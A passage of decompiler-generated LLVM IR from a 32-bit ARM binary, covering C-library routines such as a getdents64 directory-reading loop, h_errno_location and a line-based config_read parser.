  %v3_1577c = load i32, i32* %v2_1577c, align 4
  %v4_15780 = inttoptr i32 %v3_15778 to i32*
  %v5_15780 = call i32 @__getdents64(i32 %v2_15774, i32* %v4_15780, i32 %v3_1577c, i32 %v6_15768)
  %tmp9 = icmp slt i32 %v5_15780, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_15790

.thread:                                          ; preds = %dec_label_pc_15774
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_157c8

dec_label_pc_15790:                               ; preds = %dec_label_pc_15774
  %v1_15790 = load i32, i32* @r5, align 4
  %v2_15790 = add i32 %v1_15790, 8
  %v3_15790 = inttoptr i32 %v2_15790 to i32*
  store i32 %v5_15780, i32* %v3_15790, align 4
  %v0_15794 = load i32, i32* @r7, align 4
  %v1_15794 = load i32, i32* @r5, align 4
  %v2_15794 = add i32 %v1_15794, 4
  %v3_15794 = inttoptr i32 %v2_15794 to i32*
  store i32 %v0_15794, i32* %v3_15794, align 4
  %v0_15798.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15798

dec_label_pc_15798:                               ; preds = %dec_label_pc_15768, %dec_label_pc_15790
  %v1_157bc = phi i32 [ %v0_15768, %dec_label_pc_15768 ], [ %v0_15798.pre, %dec_label_pc_15790 ]
  %v1_15798 = add i32 %v1_157bc, 4
  %v2_15798 = inttoptr i32 %v1_15798 to i32*
  %v3_15798 = load i32, i32* %v2_15798, align 4
  %v1_1579c = add i32 %v1_157bc, 12
  %v2_1579c = inttoptr i32 %v1_1579c to i32*
  %v3_1579c = load i32, i32* %v2_1579c, align 4
  %v2_157a0 = add i32 %v3_1579c, %v3_15798
  store i32 %v2_157a0, i32* @r4, align 4
  %v3_157a4 = inttoptr i32 %v2_157a0 to i32*
  %v4_157a4 = load i32, i32* %v3_157a4, align 4
  %v1_157a8 = add i32 %v2_157a0, 4
  %v2_157a8 = inttoptr i32 %v1_157a8 to i32*
  %v3_157a8 = load i32, i32* %v2_157a8, align 4
  %v1_157ac = add i32 %v2_157a0, 16
  %v2_157ac = inttoptr i32 %v1_157ac to i16*
  %v3_157ac = load i16, i16* %v2_157ac, align 2
  %v4_157ac = zext i16 %v3_157ac to i32
  %v1_157b0 = add i32 %v2_157a0, 8
  %v2_157b0 = inttoptr i32 %v1_157b0 to i32*
  %v3_157b0 = load i32, i32* %v2_157b0, align 4
  store i32 %v3_157b0, i32* %ip.global-to-local, align 4
  %v2_157b4 = add i32 %v4_157ac, %v3_15798
  %v2_157b8 = or i32 %v3_157a8, %v4_157a4
  %v4_157b8 = icmp eq i32 %v2_157b8, 0
  store i32 %v2_157b4, i32* %v2_15798, align 4
  %v0_157c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_157c0 = load i32, i32* @r5, align 4
  %v2_157c0 = add i32 %v1_157c0, 16
  %v3_157c0 = inttoptr i32 %v2_157c0 to i32*
  store i32 %v0_157c0, i32* %v3_157c0, align 4
  br i1 %v4_157b8, label %dec_label_pc_15768, label %dec_label_pc_157c8

dec_label_pc_157c8:                               ; preds = %dec_label_pc_15798, %.thread
  %v0_157d4 = load i32, i32* @r6, align 4
  %v2_157d4 = add i32 %v0_157d4, 24
  %v3_157d4 = inttoptr i32 %v2_157d4 to i32*
  %v4_157d4 = load i32, i32* %v3_157d4, align 4
  store i32 %v4_157d4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_157d4)
  %v0_157e0 = load i32, i32* @r4, align 4
  ret i32 %v0_157e0

; uselistorder directives
  uselistorder i32 %v2_157a0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_157bc, { 1, 0 }
  uselistorder i32 %v6_15768, { 1, 0 }
  uselistorder i32 %v0_15768, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_15798, { 1, 0 }
}

define i32 @function_157f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_157f4:
  %v0_157f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_157f4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_157f4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_157f4, %bb
  %v10_15800 = phi i32 [ %arg1, %dec_label_pc_157f4 ], [ 0, %bb ]
  ret i32 %v10_15800

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 29312)
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15820 = load i32, i32* @r4, align 4
  %v6_15820 = load i32, i32* @r5, align 4
  %v9_15820 = load i32, i32* @r6, align 4
  %v12_15820 = load i32, i32* @r7, align 4
  %v15_15820 = load i32, i32* @r8, align 4
  %v18_15820 = load i32, i32* @sb, align 4
  %v21_15820 = load i32, i32* @sl, align 4
  %v24_15820 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_15824 = icmp eq i32* %arg1, null
  store i1 %v2_15824, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_15824, label %dec_label_pc_15b34, label %dec_label_pc_1583c

dec_label_pc_1583c:                               ; preds = %entry
  %v1_1583c = urem i32 %arg3, 256
  store i32 %v1_1583c, i32* @sb, align 4
  %v1_15840 = and i32 %arg3, ptrtoint (i32* @global_var_ff00.41 to i32)
  %v3_15844 = udiv i32 %v1_15840, 256
  %v3_15848 = mul nuw nsw i32 %v1_1583c, 4
  %v1_15850 = or i32 %v3_15848, 1
  %v1_1585c = and i32 %arg3, 131072
  %v1_15860 = add nsw i32 %v1_1583c, -1
  %v1_1586c = and i32 %arg3, 262144
  store i32 %v1_1586c, i32* %r2.global-to-local, align 4
  %v1_15870 = and i32 %arg3, 65536
  store i32 %v1_15870, i32* %r3.global-to-local, align 4
  store i32 %v1_15870, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_15880 = add i32 %arg4, 1
  store i32 %v1_15880, i32* @sl, align 4
  %v2_15a00 = inttoptr i32 %arg2 to i32*
  %v2_15a10 = icmp eq i32 %v1_1585c, 0
  %v2_15a68 = icmp eq i32 %v1_1586c, 0
  br label %dec_label_pc_15884

dec_label_pc_15884:                               ; preds = %dec_label_pc_15884.backedge, %dec_label_pc_1583c
  %v2_158a0 = phi i32 [ %v0_15884.pre, %dec_label_pc_15884.backedge ], [ %tmp, %dec_label_pc_1583c ]
  %v1_15884 = add i32 %v2_158a0, 4
  %v2_15884 = inttoptr i32 %v1_15884 to i32*
  %v3_15884 = load i32, i32* %v2_15884, align 4
  store i32 %v3_15884, i32* %r3.global-to-local, align 4
  %v2_15888 = icmp eq i32 %v3_15884, 0
  store i1 %v2_15888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15888, label %dec_label_pc_15890, label %dec_label_pc_158d8

dec_label_pc_15890:                               ; preds = %dec_label_pc_15884
  %v1_15890 = add i32 %v2_158a0, 16
  %v2_15890 = inttoptr i32 %v1_15890 to i32*
  %v3_15890 = load i32, i32* %v2_15890, align 4
  store i32 %v3_15890, i32* %r3.global-to-local, align 4
  %v2_15894 = icmp eq i32 %v3_15890, 0
  store i1 %v2_15894, i1* %cpsr_z.global-to-local, align 1
  %v1_15898 = add i32 %v2_158a0, 8
  %v2_15898 = inttoptr i32 %v1_15898 to i32*
  %v3_15898 = load i32, i32* %v2_15898, align 4
  store i32 %v3_15898, i32* %r3.global-to-local, align 4
  br i1 %v2_15894, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_15890
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_15890, align 4
  %v0_158a4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_15890, %bb
  %v0_158a4 = phi i32 [ %v0_158a4.pre, %bb ], [ %v3_15898, %dec_label_pc_15890 ]
  %v2_158a4 = icmp eq i32 %v0_158a4, 0
  store i1 %v2_158a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158a4, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_15850, i32* %r3.global-to-local, align 4
  %v2_158ac = load i32, i32* @r5, align 4
  %v3_158ac = add i32 %v2_158ac, 8
  %v4_158ac = inttoptr i32 %v3_158ac to i32*
  store i32 %v1_15850, i32* %v4_158ac, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_158b0 = load i32, i32* @r5, align 4
  %v1_158b0 = add i32 %v0_158b0, 16
  %v2_158b0 = inttoptr i32 %v1_158b0 to i32*
  %v3_158b0 = load i32, i32* %v2_158b0, align 4
  store i32 %v3_158b0, i32* %r0.global-to-local, align 4
  %v1_158b4 = add i32 %v0_158b0, 8
  %v2_158b4 = inttoptr i32 %v1_158b4 to i32*
  %v3_158b4 = load i32, i32* %v2_158b4, align 4
  store i32 %v3_158b4, i32* %r3.global-to-local, align 4
  %v2_158b8 = add i32 %v3_158b4, %v3_158b0
  store i32 %v2_158b8, i32* %r0.global-to-local, align 4
  %v1_158bc = call i32 @malloc(i32 %v2_158b8)
  store i32 %v1_158bc, i32* %r0.global-to-local, align 4
  %v2_158c0 = icmp eq i32 %v1_158bc, 0
  store i1 %v2_158c0, i1* %cpsr_z.global-to-local, align 1
  %v1_158c4 = load i32, i32* @r5, align 4
  %v2_158c4 = add i32 %v1_158c4, 4
  %v3_158c4 = inttoptr i32 %v2_158c4 to i32*
  store i32 %v1_158bc, i32* %v3_158c4, align 4
  br i1 %v2_158c0, label %dec_label_pc_15b34, label %dec_label_pc_158cc

dec_label_pc_158cc:                               ; preds = %.thread
  %v0_158cc = load i32, i32* @r5, align 4
  %v1_158cc = add i32 %v0_158cc, 20
  %v2_158cc = inttoptr i32 %v1_158cc to i32*
  %v3_158cc = load i32, i32* %v2_158cc, align 4
  %v1_158d0 = or i32 %v3_158cc, 1
  store i32 %v1_158d0, i32* %r3.global-to-local, align 4
  store i32 %v1_158d0, i32* %v2_158cc, align 4
  %v0_158d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_158d8

dec_label_pc_158d8:                               ; preds = %dec_label_pc_15884, %dec_label_pc_158cc
  %v1_158e0 = phi i32 [ %v2_158a0, %dec_label_pc_15884 ], [ %v0_158d8.pre, %dec_label_pc_158cc ]
  %v1_158d8 = add i32 %v1_158e0, 4
  %v2_158d8 = inttoptr i32 %v1_158d8 to i32*
  %v3_158d8 = load i32, i32* %v2_158d8, align 4
  store i32 %v3_158d8, i32* %r2.global-to-local, align 4
  %v4_158d8 = add i32 %v1_158e0, 8
  %v5_158d8 = inttoptr i32 %v4_158d8 to i32*
  %v6_158d8 = load i32, i32* %v5_158d8, align 4
  %v2_158dc = add i32 %v6_158d8, %v3_158d8
  store i32 %v2_158dc, i32* %r3.global-to-local, align 4
  %v2_158e0 = add i32 %v1_158e0, 12
  %v3_158e0 = inttoptr i32 %v2_158e0 to i32*
  store i32 %v2_158dc, i32* %v3_158e0, align 4
  %v0_158e4 = load i32, i32* @fp, align 4
  store i32 %v0_158e4, i32* @r6, align 4
  br label %dec_label_pc_158e8

dec_label_pc_158e8:                               ; preds = %dec_label_pc_15974, %dec_label_pc_15960, %dec_label_pc_158d8
  %v0_158f0 = phi i32 [ %v0_158e4, %dec_label_pc_158d8 ], [ %v1_15960, %dec_label_pc_15960 ], [ %v0_158f0.pre.pre, %dec_label_pc_15974 ]
  %v0_158e8 = load i32, i32* @r5, align 4
  %v1_158e8 = add i32 %v0_158e8, 12
  store i32 %v1_158e8, i32* %r0.global-to-local, align 4
  %v1_158ec = inttoptr i32 %v1_158e8 to i32*
  %v2_158ec = load i32, i32* %v1_158ec, align 4
  store i32 %v2_158ec, i32* %r0.global-to-local, align 4
  %v3_158ec = add i32 %v0_158e8, 16
  %v4_158ec = inttoptr i32 %v3_158ec to i32*
  %v5_158ec = load i32, i32* %v4_158ec, align 4
  %v2_158f0 = add i32 %v2_158ec, %v0_158f0
  store i32 %v2_158f0, i32* %r0.global-to-local, align 4
  %v2_158f4 = sub i32 %v5_158ec, %v0_158f0
  %v1_158f8 = inttoptr i32 %v0_158e8 to i32*
  %v2_158f8 = load i32, i32* %v1_158f8, align 4
  store i32 %v2_158f8, i32* %r2.global-to-local, align 4
  %v3_158fc = call i32 @fgets(i32 %v2_158f0, i32 %v2_158f4, i32 %v2_158f8)
  store i32 %v3_158fc, i32* %r0.global-to-local, align 4
  store i32 %v3_158fc, i32* %r4.global-to-local, align 4
  %v2_15900 = icmp eq i32 %v3_158fc, 0
  store i1 %v2_15900, i1* %cpsr_z.global-to-local, align 1
  %v0_15908 = load i32, i32* @r5, align 4
  %v1_15908 = add i32 %v0_15908, 12
  br i1 %v2_15900, label %dec_label_pc_15908, label %dec_label_pc_15920

dec_label_pc_15908:                               ; preds = %dec_label_pc_158e8
  store i32 %v1_15908, i32* %r0.global-to-local, align 4
  %v1_1590c = inttoptr i32 %v1_15908 to i32*
  %v2_1590c = load i32, i32* %v1_1590c, align 4
  store i32 %v2_1590c, i32* %r0.global-to-local, align 4
  %v3_1590c = add i32 %v0_15908, 16
  %v4_1590c = inttoptr i32 %v3_1590c to i32*
  %v5_1590c = load i32, i32* %v4_1590c, align 4
  store i32 %v5_1590c, i32* @r2, align 4
  %v2_15914 = inttoptr i32 %v2_1590c to i8*
  %v3_15914 = call i32 @__GI_memset(i8* %v2_15914, i32 0)
  store i32 %v3_15914, i32* %r0.global-to-local, align 4
  %v0_15918 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b38

dec_label_pc_15920:                               ; preds = %dec_label_pc_158e8
  %v2_15920 = inttoptr i32 %v1_15908 to i32*
  %v3_15920 = load i32, i32* %v2_15920, align 4
  store i32 %v3_15920, i32* @r4, align 4
  %v1_15924 = load i32, i32* @r6, align 4
  %v2_15924 = add i32 %v1_15924, %v3_15920
  %v3_15924 = inttoptr i32 %v2_15924 to i8*
  store i32 %v2_15924, i32* %r0.global-to-local, align 4
  %v3_15928 = call i32 @strlen(i8* %v3_15924)
  %v0_15930 = load i32, i32* @r6, align 4
  %v2_15930 = add i32 %v0_15930, %v3_15928
  store i32 %v2_15930, i32* @r6, align 4
  %v0_15934 = load i32, i32* @r4, align 4
  store i32 %v0_15934, i32* @r0, align 4
  %v2_15938 = call i32 @__GI_strchr(i32 %v0_15934, i32 10)
  store i32 %v2_15938, i32* %r0.global-to-local, align 4
  %v2_1593c = icmp eq i32 %v2_15938, 0
  store i1 %v2_1593c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1593c, label %dec_label_pc_15968, label %dec_label_pc_15944

dec_label_pc_15944:                               ; preds = %dec_label_pc_15920
  %v1_15944 = inttoptr i32 %v2_15938 to i8*
  %v2_15944 = load i8, i8* %v1_15944, align 1
  %v3_15944 = zext i8 %v2_15944 to i32
  %v1_15948 = add nuw nsw i32 %v3_15944, 255
  %v1_1594c = urem i32 %v1_15948, 256
  store i32 %v1_1594c, i32* %r3.global-to-local, align 4
  %v7_15950 = icmp eq i32 %v1_1594c, 92
  store i1 %v7_15950, i1* %cpsr_z.global-to-local, align 1
  %v1_15954 = trunc i32 %v1_15948 to i8
  store i8 %v1_15954, i8* %v1_15944, align 1
  %v0_15958 = load i32, i32* @r6, align 4
  %v1_15958 = add i32 %v0_15958, -1
  store i32 %v1_15958, i32* @r6, align 4
  %v0_1595c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1595c, label %dec_label_pc_15960, label %dec_label_pc_159ec

dec_label_pc_15960:                               ; preds = %dec_label_pc_15944
  %v1_15960 = add i32 %v0_15958, -2
  store i32 %v1_15960, i32* @r6, align 4
  br label %dec_label_pc_158e8

dec_label_pc_15968:                               ; preds = %dec_label_pc_15920
  %v0_15968 = load i32, i32* @r5, align 4
  %v1_15968 = add i32 %v0_15968, 20
  %v2_15968 = inttoptr i32 %v1_15968 to i32*
  %v3_15968 = load i32, i32* %v2_15968, align 4
  store i32 %v3_15968, i32* %r3.global-to-local, align 4
  %v2_1596c = icmp eq i32 %v3_15968, 0
  store i1 %v2_1596c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1596c, label %dec_label_pc_159a4, label %dec_label_pc_15974

dec_label_pc_15974:                               ; preds = %dec_label_pc_15968
  %v1_15974 = add i32 %v0_15968, 16
  %v2_15974 = inttoptr i32 %v1_15974 to i32*
  %v3_15974 = load i32, i32* %v2_15974, align 4
  store i32 %v3_15974, i32* %r3.global-to-local, align 4
  %v1_15978 = add i32 %v0_15968, 8
  %v2_15978 = inttoptr i32 %v1_15978 to i32*
  %v3_15978 = load i32, i32* %v2_15978, align 4
  %v1_1597c = add i32 %v3_15974, 4096
  store i32 %v1_1597c, i32* %r3.global-to-local, align 4
  %v2_15980 = add i32 %v3_15978, %v1_1597c
  store i32 %v1_1597c, i32* %v2_15974, align 4
  %v0_15988 = load i32, i32* @r5, align 4
  %v1_15988 = add i32 %v0_15988, 4
  %v2_15988 = inttoptr i32 %v1_15988 to i32*
  %v3_15988 = load i32, i32* %v2_15988, align 4
  store i32 %v3_15988, i32* %r0.global-to-local, align 4
  %v2_1598c = inttoptr i32 %v3_15988 to i32*
  %v3_1598c = call i32 @realloc(i32* %v2_1598c, i32 %v2_15980)
  store i32 %v3_1598c, i32* %r0.global-to-local, align 4
  %v0_15990 = load i32, i32* @r5, align 4
  %v1_15990 = add i32 %v0_15990, 8
  %v2_15990 = inttoptr i32 %v1_15990 to i32*
  %v3_15990 = load i32, i32* %v2_15990, align 4
  %v2_15994 = add i32 %v3_15990, %v3_1598c
  store i32 %v2_15994, i32* %r3.global-to-local, align 4
  %v2_15998 = add i32 %v0_15990, 12
  %v3_15998 = inttoptr i32 %v2_15998 to i32*
  store i32 %v2_15994, i32* %v3_15998, align 4
  %v1_1599c = load i32, i32* @r5, align 4
  %v2_1599c = add i32 %v1_1599c, 4
  %v3_1599c = inttoptr i32 %v2_1599c to i32*
  store i32 %v3_1598c, i32* %v3_1599c, align 4
  %v0_158f0.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_158e8

dec_label_pc_159a4:                               ; preds = %dec_label_pc_15968, %.dec_label_pc_159a4_crit_edge
  %v0_159a4 = phi i32 [ %v0_159a4.pre, %.dec_label_pc_159a4_crit_edge ], [ %v0_15968, %dec_label_pc_15968 ]
  %v1_159a4 = inttoptr i32 %v0_159a4 to i32*
  %v2_159a4 = load i32, i32* %v1_159a4, align 4
  %v1_159a8 = add i32 %v2_159a4, 52
  %v2_159a8 = inttoptr i32 %v1_159a8 to i32*
  %v3_159a8 = load i32, i32* %v2_159a8, align 4
  store i32 %v3_159a8, i32* %r3.global-to-local, align 4
  %v2_159ac = icmp eq i32 %v3_159a8, 0
  store i1 %v2_159ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159ac, label %dec_label_pc_159d8, label %dec_label_pc_159b4

dec_label_pc_159b4:                               ; preds = %dec_label_pc_159a4
  %v1_159b4 = add i32 %v2_159a4, 16
  %v2_159b4 = inttoptr i32 %v1_159b4 to i32*
  %v3_159b4 = load i32, i32* %v2_159b4, align 4
  store i32 %v3_159b4, i32* %r2.global-to-local, align 4
  %v1_159b8 = add i32 %v2_159a4, 24
  %v2_159b8 = inttoptr i32 %v1_159b8 to i32*
  %v3_159b8 = load i32, i32* %v2_159b8, align 4
  store i32 %v3_159b8, i32* %r3.global-to-local, align 4
  %v3_159bc = icmp ult i32 %v3_159b4, %v3_159b8
  %v9_159bc = icmp eq i32 %v3_159b4, %v3_159b8
  store i1 %v9_159bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_159bc, label %dec_label_pc_159e0thread-pre-split, label %dec_label_pc_159cc

dec_label_pc_159cc:                               ; preds = %dec_label_pc_159b4
  store i32 %v2_159a4, i32* %r0.global-to-local, align 4
  %v1_159d0 = inttoptr i32 %v2_159a4 to i16*
  %v2_159d0 = call i32 @getc_unlocked(i16* %v1_159d0)
  store i32 %v2_159d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_159e0

dec_label_pc_159d8:                               ; preds = %dec_label_pc_159a4
  store i32 %v2_159a4, i32* %r0.global-to-local, align 4
  %v1_159dc = call i32 @__GI_fgetc(i32 %v2_159a4)
  store i32 %v1_159dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_159e0

dec_label_pc_159e0thread-pre-split:               ; preds = %dec_label_pc_159b4
  %v2_159c0 = inttoptr i32 %v3_159b4 to i8*
  %v3_159c0 = load i8, i8* %v2_159c0, align 1
  %v4_159c0 = zext i8 %v3_159c0 to i32
  store i32 %v4_159c0, i32* %r0.global-to-local, align 4
  %v6_159c0 = add i32 %v3_159b4, 1
  store i32 %v6_159c0, i32* %r2.global-to-local, align 4
  store i32 %v6_159c0, i32* %v2_159b4, align 4
  %v0_159e0.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_159e0

dec_label_pc_159e0:                               ; preds = %dec_label_pc_159e0thread-pre-split, %dec_label_pc_159cc, %dec_label_pc_159d8
  %v1_159e4 = phi i32 [ %v0_159e0.pr, %dec_label_pc_159e0thread-pre-split ], [ %v2_159d0, %dec_label_pc_159cc ], [ %v1_159dc, %dec_label_pc_159d8 ]
  %v7_159e0 = icmp eq i32 %v1_159e4, 10
  store i1 %v7_159e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_159e0, label %dec_label_pc_159ec.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_159e0
  %v8_159e4 = icmp eq i32 %v1_159e4, -1
  store i1 %v8_159e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_159e4, label %dec_label_pc_159ec.loopexit, label %.dec_label_pc_159a4_crit_edge

.dec_label_pc_159a4_crit_edge:                    ; preds = %bb68
  %v0_159a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_159a4

dec_label_pc_159ec.loopexit:                      ; preds = %bb68, %dec_label_pc_159e0
  %v0_159ec.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_159ec

dec_label_pc_159ec:                               ; preds = %dec_label_pc_15944, %dec_label_pc_159ec.loopexit
  %v0_159ec = phi i32 [ %v0_159ec.pre, %dec_label_pc_159ec.loopexit ], [ %v1_15958, %dec_label_pc_15944 ]
  %v7_159ec = icmp eq i32 %v0_159ec, -1
  store i1 %v7_159ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_159ec, label %dec_label_pc_15b34, label %dec_label_pc_159f4

dec_label_pc_159f4:                               ; preds = %dec_label_pc_159ec
  %v0_159f4 = load i32, i32* @r5, align 4
  %v1_159f4 = add i32 %v0_159f4, 4
  %v2_159f4 = inttoptr i32 %v1_159f4 to i32*
  %v3_159f4 = load i32, i32* %v2_159f4, align 4
  store i32 %v3_159f4, i32* %r0.global-to-local, align 4
  store i32 %v3_15848, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_159f4, i32* %v2_15a00, align 4
  %v0_15a04 = load i32, i32* @fp, align 4
  %v2_15a08 = inttoptr i32 %v3_159f4 to i8*
  %v3_15a08 = call i32 @__GI_memset(i8* %v2_15a08, i32 %v0_15a04)
  store i32 %v3_15a08, i32* %r0.global-to-local, align 4
  store i32 %v1_1585c, i32* %r2.global-to-local, align 4
  store i1 %v2_15a10, i1* %cpsr_z.global-to-local, align 1
  %v0_15a14 = load i32, i32* @r5, align 4
  %v1_15a14 = add i32 %v0_15a14, 12
  %v2_15a14 = inttoptr i32 %v1_15a14 to i32*
  %v3_15a14 = load i32, i32* %v2_15a14, align 4
  store i32 %v3_15a14, i32* @r4, align 4
  br i1 %v2_15a10, label %dec_label_pc_15a2c, label %dec_label_pc_15a1c

dec_label_pc_15a1c:                               ; preds = %dec_label_pc_159f4
  store i32 %v3_15a14, i32* @r0, align 4
  %v1_15a24 = inttoptr i32 %v3_15a14 to i8*
  %v2_15a24 = call i32 @__GI_strspn(i8* %v1_15a24)
  store i32 %v2_15a24, i32* %r0.global-to-local, align 4
  %v0_15a28 = load i32, i32* @r4, align 4
  %v2_15a28 = add i32 %v0_15a28, %v2_15a24
  store i32 %v2_15a28, i32* @r4, align 4
  br label %dec_label_pc_15a2c

dec_label_pc_15a2c:                               ; preds = %dec_label_pc_159f4, %dec_label_pc_15a1c
  %v0_15b0413 = phi i32 [ %v3_15a14, %dec_label_pc_159f4 ], [ %v2_15a28, %dec_label_pc_15a1c ]
  %v1_15a2c = inttoptr i32 %v0_15b0413 to i8*
  %v2_15a2c = load i8, i8* %v1_15a2c, align 1
  %v3_15a2c = zext i8 %v2_15a2c to i32
  store i32 %v3_15a2c, i32* %r2.global-to-local, align 4
  %v2_15a30 = icmp eq i8 %v2_15a2c, 0
  store i1 %v2_15a30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a30, label %dec_label_pc_15884.backedge, label %dec_label_pc_15a38

dec_label_pc_15884.backedge:                      ; preds = %dec_label_pc_15a2c, %dec_label_pc_15b2c, %dec_label_pc_15a38
  %v0_15884.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15884

dec_label_pc_15a38:                               ; preds = %dec_label_pc_15a2c
  %v0_15a38 = load i32, i32* @r7, align 4
  %v1_15a38 = inttoptr i32 %v0_15a38 to i8*
  %v2_15a38 = load i8, i8* %v1_15a38, align 1
  %v3_15a38 = zext i8 %v2_15a38 to i32
  store i32 %v3_15a38, i32* %r3.global-to-local, align 4
  %v9_15a3c = icmp eq i8 %v2_15a38, %v2_15a2c
  store i1 %v9_15a3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15a3c, label %dec_label_pc_15884.backedge, label %dec_label_pc_15b04.preheader

dec_label_pc_15b04.preheader:                     ; preds = %dec_label_pc_15a38
  %v1_15a40 = load i32, i32* @fp, align 4
  store i32 %v1_15a40, i32* @r6, align 4
  %v2_15b0415 = load i8, i8* %v1_15a2c, align 1
  %v3_15b0416 = zext i8 %v2_15b0415 to i32
  store i32 %v3_15b0416, i32* %r2.global-to-local, align 4
  %v2_15b0817 = icmp eq i8 %v2_15b0415, 0
  store i1 %v2_15b0817, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b0817, label %dec_label_pc_15b20, label %dec_label_pc_15b10.preheader

dec_label_pc_15b10.preheader:                     ; preds = %dec_label_pc_15b04.preheader
  %v2_15b1082 = load i8, i8* %v1_15a38, align 1
  %v3_15b1083 = zext i8 %v2_15b1082 to i32
  store i32 %v3_15b1083, i32* %r3.global-to-local, align 4
  %v9_15b1486 = icmp eq i8 %v2_15b1082, %v2_15b0415
  store i1 %v9_15b1486, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15b1486, label %dec_label_pc_15b20, label %bb74

dec_label_pc_15a4c:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15a50 = load i32, i32* %v2_15a00, align 4
  store i32 %v2_15a50, i32* %r3.global-to-local, align 4
  store i32 %v1_15860, i32* %r2.global-to-local, align 4
  %v9_15a58 = icmp eq i32 %v2_15a5c88, %v1_15860
  store i1 %v9_15a58, i1* %cpsr_z.global-to-local, align 1
  %v5_15a5c = mul i32 %v2_15a5c88, 4
  %v6_15a5c = add i32 %v2_15a50, %v5_15a5c
  %v7_15a5c = inttoptr i32 %v6_15a5c to i32*
  store i32 %v0_15a5c87, i32* %v7_15a5c, align 4
  br i1 %v9_15a58, label %dec_label_pc_15a64, label %dec_label_pc_15a70

dec_label_pc_15a64:                               ; preds = %dec_label_pc_15a4c
  store i32 %v1_1586c, i32* %r3.global-to-local, align 4
  store i1 %v2_15a68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a68, label %dec_label_pc_15a70, label %dec_label_pc_15a90

dec_label_pc_15a70:                               ; preds = %dec_label_pc_15a64, %dec_label_pc_15a4c
  %v0_15a70 = load i32, i32* @r7, align 4
  %v1_15a70 = inttoptr i32 %v0_15a70 to i8*
  %v2_15a70 = load i8, i8* %v1_15a70, align 1
  %v3_15a70 = zext i8 %v2_15a70 to i32
  store i32 %v3_15a70, i32* %r3.global-to-local, align 4
  %v2_15a74 = icmp eq i8 %v2_15a70, 0
  store i1 %v2_15a74, i1* %cpsr_z.global-to-local, align 1
  %v0_15a78 = load i32, i32* @r4, align 4
  store i32 %v0_15a78, i32* @r0, align 4
  %v1_15a7c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_15a74, i32 %v1_15a7c, i32 %v0_15a70
  store i32 %storemerge, i32* @r1, align 4
  %v0_15a84 = call i32 @strcspn()
  store i32 %v0_15a84, i32* %r0.global-to-local, align 4
  %v0_15a88 = load i32, i32* @r4, align 4
  %v2_15a88 = add i32 %v0_15a88, %v0_15a84
  store i32 %v2_15a88, i32* @r4, align 4
  br label %dec_label_pc_15ac8

dec_label_pc_15a90:                               ; preds = %dec_label_pc_15a64
  %v0_15a90 = load i32, i32* @r4, align 4
  store i32 %v0_15a90, i32* @r0, align 4
  %v0_15a94 = load i32, i32* @r7, align 4
  %v1_15a94 = inttoptr i32 %v0_15a94 to i8*
  %v2_15a94 = load i8, i8* %v1_15a94, align 1
  %v3_15a94 = zext i8 %v2_15a94 to i32
